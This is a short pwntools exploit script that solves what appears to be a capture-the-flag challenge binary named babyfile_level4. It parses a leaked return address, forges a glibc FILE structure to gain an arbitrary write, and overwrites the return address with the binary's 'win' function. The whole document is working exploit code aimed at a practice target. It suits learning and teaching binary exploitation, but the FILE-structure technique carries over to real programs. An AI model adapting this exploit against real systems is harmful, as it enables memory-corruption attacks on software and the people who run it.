from pwn import *

context.arch = 'amd64'

elf = ELF("/challenge/babyfile_level4")
p = process("/challenge/babyfile_level4")

p.recvuntil(b"stored at: ")
ret_addr = int(p.recvuntil(b'\n')[-15:-1], 16)

fs = FileStructure()
payload = fs.read(ret_addr, 1000)

p.send(payload)

p.send(p64(elf.sym['win']) + b"\x00" * (1000 - 8))

p.interactive()
